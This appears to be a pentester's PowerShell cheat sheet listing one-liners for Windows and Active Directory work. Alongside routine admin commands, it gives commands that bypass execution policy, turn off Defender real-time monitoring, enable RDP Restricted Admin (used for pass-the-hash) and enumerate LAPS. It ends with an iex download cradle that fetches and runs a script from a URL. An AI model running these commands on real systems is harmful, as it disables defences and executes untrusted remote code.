# Powershell

## PowerShell oneliner

### Bypass execution policy

Spawn bypass execution policy with Powershell.

```sh title:"Powershell Spawn Bypass Execution Policy"
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
```
<!-- cheat -->

### Enable RDP Restricted Admin

Enable RDP restricted admin with Powershell.

```sh title:"Powershell Enable RDP Restricted Admin"
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```
<!-- cheat -->

### Disable Defender RTP

Disable defender RTP with Powershell.

```sh title:"Powershell Disable Defender RTP"
Set-MpPreference -DisableRealTimeMonitoring $true
```
<!-- cheat -->

### Defender status

Read defender status with Powershell.

```sh title:"Powershell Read Defender Status"
Get-MpComputerStatus
```
<!-- cheat -->

### Install RSAT-AD (Server)

Install RSAT AD (Server) with Powershell.

```sh title:"Powershell Install RSAT AD (Server)"
Install-WindowsFeature RSAT-AD-PowerShell
```
<!-- cheat -->

### Install RSAT (Desktop)

Install RSAT (Desktop) with Powershell.

```sh title:"Powershell Install RSAT (Desktop)"
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
```
<!-- cheat -->

### Import AD module

Spawn import AD module with Powershell.

```sh title:"Powershell Spawn Import AD Module"
Import-Module ActiveDirectory
```
<!-- cheat -->

### AppLocker policy

Read AppLocker policy with Powershell.

```sh title:"Powershell Read AppLocker Policy"
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
<!-- cheat -->

### LAPS delegated groups

Read LAPS delegated groups with Powershell.

```sh title:"Powershell Read LAPS Delegated Groups"
Find-LAPSDelegatedGroups
```
<!-- cheat -->

### LAPS extended rights

Read LAPS extended rights with Powershell.

```sh title:"Powershell Read LAPS Extended Rights"
Find-AdmPwdExtendedRights
```
<!-- cheat -->

### LAPS-enabled computers

Dump LAPS enabled computers with Powershell.

```sh title:"Powershell Dump LAPS Enabled Computers"
Get-LAPSComputers
```
<!-- cheat -->

### List loaded modules

List loaded modules with Powershell.

```sh title:"Powershell List Loaded Modules"
Get-Module
```
<!-- cheat -->

### Show execution policy

Show execution policy with Powershell.

```sh title:"Powershell Show Execution Policy"
Get-ExecutionPolicy -List
```
<!-- cheat -->

### Per-process bypass

Spawn per process bypass with Powershell.

```sh title:"Powershell Spawn Per Process Bypass"
Set-ExecutionPolicy Bypass -Scope Process
```
<!-- cheat -->

### Inline script from URL

Download inline script from URL with Powershell.

```sh title:"Powershell Download Inline Script from URL"
iex(New-Object Net.WebClient).DownloadString('$URL')
```
<!-- cheat
var URL
-->
